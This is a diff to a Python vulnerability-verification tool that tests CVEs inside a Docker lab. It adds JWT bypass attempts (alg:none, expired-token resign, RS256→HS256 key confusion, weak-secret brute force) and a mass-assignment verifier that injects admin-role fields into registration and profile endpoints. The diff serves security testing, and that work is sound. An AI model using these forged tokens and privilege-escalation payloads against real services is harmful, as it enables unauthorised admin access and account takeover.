@@ -6070,25 +6070,56 @@ def verify_generic_jwt_bypass(
             sig_b64 = _b64.urlsafe_b64encode(sig).rstrip(b"=").decode()
             return f"{header}.{body_b64}.{sig_b64}"
 
-        token_id = _token()
-        payload_data = {"sub": f"admin-{token_id}", "role": "admin", "iat": 1700000000, "exp": 9999999999}
+        def _make_jwt_rs256_confusion(payload: dict) -> str:
+            """Key confusion: sign HS256 token using a known weak/dummy RSA public key.
+            This exploits servers that accept HS256 tokens signed with their own
+            RS256 public key (CVE-2016-5431 style).
+            """
+            _DUMMY_PUB = b"-----BEGIN PUBLIC KEY-----\nMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAMqp9yFSxpGD34jrKFAiGxkDFBHNLXMd\nGZLLJi25vJBqJz+VZBqKG6S0Q55PZiJO2BxjR2TflCeStx8dHD0CAwEAAQ==\n-----END PUBLIC KEY-----\n"
+            import hmac as _hmac, hashlib as _hs
+            header = _b64.urlsafe_b64encode(
+                _json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b"=").decode()
+            body_b64 = _b64.urlsafe_b64encode(
+                _json.dumps(payload).encode()).rstrip(b"=").decode()
+            signing_input = f"{header}.{body_b64}".encode()
+            sig = _hmac.new(_DUMMY_PUB, signing_input, _hs.sha256).digest()
+            return f"{header}.{body_b64}.{_b64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"
 
-        _weak_secrets = ["secret", "password", "changeme", "123456", "jwt", ""]
+        def _make_jwt_expired_resign(payload: dict) -> str:
+            """Resign an expired token with alg:none — tests if exp is not validated."""
+            old_payload = {**payload, "exp": 1000000000}  # expired 2001
+            return _make_jwt_none(old_payload)
+
+        token_id = _token()
+        payload_data = {
+            "sub": f"admin-{token_id}", "role": "admin", "is_admin": True,
+            "iat": 1700000000, "exp": 9999999999,
+        }
+
+        _weak_secrets = ["secret", "password", "changeme", "123456", "jwt", "admin",
+                         "supersecret", "your-256-bit-secret", "binoracle", ""]
         if weak_secret and weak_secret not in _weak_secrets:
             _weak_secrets.insert(0, weak_secret)
         _weak_attempts = [(f"weak-secret ({s!r})", _make_jwt_weak(payload_data, s))
                           for s in _weak_secrets if s != ""]
         for label, jwt_token in [
             ("alg:none bypass", _make_jwt_none(payload_data)),
+            ("alg:none expired resign", _make_jwt_expired_resign(payload_data)),
+            ("RS256→HS256 key confusion", _make_jwt_rs256_confusion(payload_data)),
             *_weak_attempts,
         ]:
             step(f"JWT bypass: probando {label} contra {endpoint}")
             hdrs = {"Authorization": f"Bearer {jwt_token}",
                     "Content-Type": "application/json"}
-            st, _, body_bytes = _http_request(
-                base_url, endpoint, http_method,
-                headers=hdrs, timeout=15.0)
-            body = (body_bytes or b"").decode("utf-8", errors="replace")
+            try:
+                r = _http_request(
+                    http_method, base_url.rstrip("/") + endpoint,
+                    headers=hdrs, timeout=15.0)
+                st = r.status_code
+                body = getattr(r, "text", "") or ""
+            except Exception as _exc:
+                step(f"  error de red JWT: {_exc}")
+                continue
             step(f"  respuesta: status={st} len={len(body)}")
             confirmed = False
             if confirm_string and confirm_string in body:
@@ -6570,4 +6601,291 @@ def verify_generic_multistep(
         return res
     finally:
         step("desmontando el laboratorio generico (multistep)...")
+        lab.teardown()
+
+
+# ---------------------------------------------------------------------------
+# Mass Assignment verifier
+# Covers CVEs where privileged fields (role, isAdmin, is_superuser, group, …)
+# can be injected via a user-controlled JSON/form body on registration/update
+# endpoints.  Examples: CVE-2023-22621 (Strapi admin reg), CVE-2019-11503
+# (Ghost role escalation), countless Node.js / Laravel / DRF API CVEs.
+# ---------------------------------------------------------------------------
+
+#: Privileged fields to inject per framework/stack family
+_MASS_ASSIGN_FIELD_SETS = [
+    # Generic escalation fields (try first — broad coverage)
+    {"role": "admin", "is_admin": True, "isAdmin": True},
+    {"role": "superuser", "is_superuser": True, "isSuperUser": True},
+    # Strapi-style: role integer ID → 1 = authenticated, 3 = superAdmin
+    {"role": {"id": 3, "type": "superAdmin"}, "blocked": False, "confirmed": True},
+    # Ghost-style: roles array with role object
+    {"roles": [{"id": "1", "name": "Administrator"}]},
+    # Laravel/DRF style
+    {"group": "admin", "groups": ["admin"], "permissions": ["admin"]},
+    # Django auth
+    {"is_staff": True, "is_superuser": True},
+    # Node.js / Mongoose style
+    {"admin": True, "superAdmin": True, "type": "admin"},
+    # Ruby on Rails Pundit/CanCan
+    {"role": "admin", "admin": True},
+]
+
+#: Signals in a successful registration/update response that suggest admin was set
+_MASS_ASSIGN_ADMIN_SIGNALS = [
+    '"role"', '"admin"', '"superAdmin"', '"is_admin"', '"isAdmin"',
+    '"is_staff"', '"is_superuser"', '"group":', '"permissions"',
+    '"type":"admin"', '"type": "admin"',
+]
+
+
+def verify_generic_mass_assignment(
+    source_dir: str,
+    register_endpoint: str = "/api/auth/local/register",
+    login_endpoint: str = "/api/auth/local",
+    profile_endpoint: str = "",
+    http_method: str = "POST",
+    confirm_string: str = "",
+    on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+    dockerfile_body: str = "", extra_files: Optional[dict] = None,
+    pkg_version: str = "",
+) -> WpVerifyResult:
+    """Verifica mass assignment en endpoints de registro / actualización de perfil.
+
+    Estrategia de 3 fases:
+      1. Registrar usuario normal (sin campos privilegiados) → extrae token + user_id
+      2. Para cada conjunto de campos privilegiados: intentar inyectarlos en el
+         cuerpo de registro / actualización de perfil
+      3. Verificar si la respuesta revela campos admin == True, o si un GET al
+         perfil devuelve campos privilegiados activos
+
+    La verificación se da cuando:
+      - La respuesta de registro contiene señales de rol admin, o
+      - confirm_string aparece en la respuesta, o
+      - _analyze_response_body detecta señales de privilegio con ≥60% confianza
+    """
+    import json as _json
+    import time as _time
+
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    boot = _bootstrap_generic_lab(
+        source_dir, step, res, budget_s,
+        dockerfile_body=dockerfile_body, extra_files=extra_files,
+        pkg_version=pkg_version,
+    )
+    if boot is None:
+        return res
+    lab, base_url, container = boot
+
+    try:
+        token_id = _token()
+        base_email = f"binoracle-{token_id}@test.local"
+        base_password = f"BinOracle!{token_id[:6]}"
+
+        # ── Phase 1: register a clean baseline user ───────────────────────────
+        step(f"[mass-assign] fase 1: registro baseline en {register_endpoint}")
+        baseline_body = _json.dumps({
+            "username": f"user-{token_id}",
+            "email": base_email,
+            "password": base_password,
+        })
+        try:
+            r0 = _http_request(
+                "POST", base_url.rstrip("/") + register_endpoint,
+                data=baseline_body,
+                headers={"Content-Type": "application/json"},
+                timeout=15,
+            )
+            baseline_status = r0.status_code
+            baseline_body_text = getattr(r0, "text", "") or ""
+        except Exception as e:
+            res.detail = f"error de red en registro baseline: {e}"
+            return res
+
+        step(f"  baseline status={baseline_status} len={len(baseline_body_text)}")
+
+        # Extract JWT from baseline response for Phase 3 (profile read)
+        baseline_jwt = ""
+        try:
+            baseline_data = _json.loads(baseline_body_text)
+            baseline_jwt = (baseline_data.get("jwt") or
+                            baseline_data.get("token") or
+                            baseline_data.get("access_token") or "")
+        except Exception:
+            pass
+
+        # ── Phase 2: probe each privileged field set ──────────────────────────
+        for field_set in _MASS_ASSIGN_FIELD_SETS:
+            tok_this = _token()
+            probe_email = f"probe-{tok_this}@test.local"
+            probe_body = {
+                "username": f"probe-{tok_this}",
+                "email": probe_email,
+                "password": base_password,
+            }
+            # Merge privileged fields into registration body
+            probe_body.update(field_set)
+            probe_json = _json.dumps(probe_body)
+            field_names = ", ".join(str(k) for k in field_set)
+            step(f"  probando inyección de campos: [{field_names}]")
+
+            try:
+                r = _http_request(
+                    "POST", base_url.rstrip("/") + register_endpoint,
+                    data=probe_json,
+                    headers={"Content-Type": "application/json"},
+                    timeout=15,
+                )
+                st = r.status_code
+                body_text = getattr(r, "text", "") or ""
+            except Exception:
+                continue
+
+            step(f"    → status={st}")
+
+            if st not in range(200, 300):
+                # 4xx might mean fields were rejected (good) or bad input (noise)
+                continue
+
+            # Check confirm_string first
+            string_ok = confirm_string and confirm_string in body_text
+            # Check for admin field signals in response
+            admin_signals = [s for s in _MASS_ASSIGN_ADMIN_SIGNALS if s.lower() in body_text.lower()]
+            # Semantic analysis
+            analysis = _analyze_response_body(
+                body_text, "missing-authorization",
+                payload=_json.dumps(field_set), confirm_string=confirm_string,
+                status_code=st,
+            )
+
+            if string_ok or (admin_signals and len(admin_signals) >= 2) or analysis.get("partial_confidence", 0) >= 0.60:
+                res.verified = True
+                res.ok = True
+                res.evidence = {
+                    "technique": "mass-assignment",
+                    "injected_fields": field_set,
+                    "register_endpoint": register_endpoint,
+                    "status": st,
+                    "admin_signals_found": admin_signals[:5],
+                    "response_body_snippet": body_text[:600],
+                    "response_analysis": analysis if analysis.get("interesting") else {},
+                }
+                diag_parts = []
+                if admin_signals:
+                    diag_parts.append(f"admin_signals={admin_signals[:3]}")
+                if string_ok:
+                    diag_parts.append(f"confirm_string='{confirm_string}'")
+                if analysis.get("interesting"):
+                    diag_parts.append(f"semantico={analysis['partial_confidence']:.0%}")
+                res.detail = (
+                    f"MASS ASSIGNMENT CONFIRMADO: campos [{field_names}] aceptados "
+                    f"por {register_endpoint} (HTTP {st}) — "
+                    + "; ".join(diag_parts)
+                )
+                step(f"VERIFICADO: mass assignment via [{field_names}]")
+
+                # Phase 3: if we got a JWT, verify the account actually got admin role
+                if profile_endpoint:
+                    probe_jwt = ""
+                    try:
+                        pd = _json.loads(body_text)
+                        probe_jwt = (pd.get("jwt") or pd.get("token") or
+                                     pd.get("access_token") or "")
+                    except Exception:
+                        pass
+                    if probe_jwt:
+                        step(f"  fase 3: verificando perfil en {profile_endpoint}")
+                        try:
+                            rp = _http_request(
+                                "GET", base_url.rstrip("/") + profile_endpoint,
+                                headers={"Authorization": f"Bearer {probe_jwt}"},
+                                timeout=10,
+                            )
+                            profile_body = getattr(rp, "text", "") or ""
+                            profile_admin_signals = [
+                                s for s in _MASS_ASSIGN_ADMIN_SIGNALS
+                                if s.lower() in profile_body.lower()
+                            ]
+                            if profile_admin_signals:
+                                res.evidence["profile_verification"] = {
+                                    "endpoint": profile_endpoint,
+                                    "status": rp.status_code,
+                                    "admin_signals": profile_admin_signals[:5],
+                                    "body_snippet": profile_body[:300],
+                                }
+                                res.detail += (f"\n\nFase 3 (perfil): señales admin "
+                                               f"confirmadas en GET {profile_endpoint}: "
+                                               f"{profile_admin_signals[:3]}")
+                                step(f"  perfil confirma privilegios: {profile_admin_signals[:3]}")
+                        except Exception:
+                            pass
+                return res
+
+            _time.sleep(0.3)  # Small delay to avoid 429
+
+        # ── Phase 2b: try PUT/PATCH update on existing user profile ───────────
+        if baseline_jwt and profile_endpoint:
+            step(f"[mass-assign] fase 2b: PUT/PATCH profile en {profile_endpoint}")
+            for field_set in _MASS_ASSIGN_FIELD_SETS[:4]:  # Top priority sets only
+                update_body = _json.dumps(field_set)
+                for m_method in ("PUT", "PATCH"):
+                    try:
+                        ru = _http_request(
+                            m_method, base_url.rstrip("/") + profile_endpoint,
+                            data=update_body,
+                            headers={
+                                "Content-Type": "application/json",
+                                "Authorization": f"Bearer {baseline_jwt}",
+                            },
+                            timeout=12,
+                        )
+                        if ru.status_code in range(200, 300):
+                            update_body_text = getattr(ru, "text", "") or ""
+                            update_signals = [
+                                s for s in _MASS_ASSIGN_ADMIN_SIGNALS
+                                if s.lower() in update_body_text.lower()
+                            ]
+                            if update_signals and len(update_signals) >= 2:
+                                field_names = ", ".join(str(k) for k in field_set)
+                                res.verified = True
+                                res.ok = True
+                                res.evidence = {
+                                    "technique": "mass-assignment-profile-update",
+                                    "injected_fields": field_set,
+                                    "update_endpoint": profile_endpoint,
+                                    "http_method": m_method,
+                                    "admin_signals_found": update_signals[:5],
+                                    "response_body_snippet": update_body_text[:400],
+                                }
+                                res.detail = (
+                                    f"MASS ASSIGNMENT VIA {m_method} PERFIL CONFIRMADO: "
+                                    f"campos [{field_names}] aceptados en {profile_endpoint} "
+                                    f"(HTTP {ru.status_code}) — señales admin: {update_signals[:3]}"
+                                )
+                                step(f"VERIFICADO: mass assignment {m_method} profile")
+                                return res
+                    except Exception:
+                        pass
+
+        res.ok = True
+        res.detail = (
+            f"mass assignment no detectado: {len(_MASS_ASSIGN_FIELD_SETS)} conjuntos "
+            f"de campos privilegiados probados en {register_endpoint} sin señales admin"
+        )
+        return res
+
+    except Exception as e:
+        res.detail = f"error inesperado en verify_generic_mass_assignment: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio generico (mass-assignment)...")
         lab.teardown()
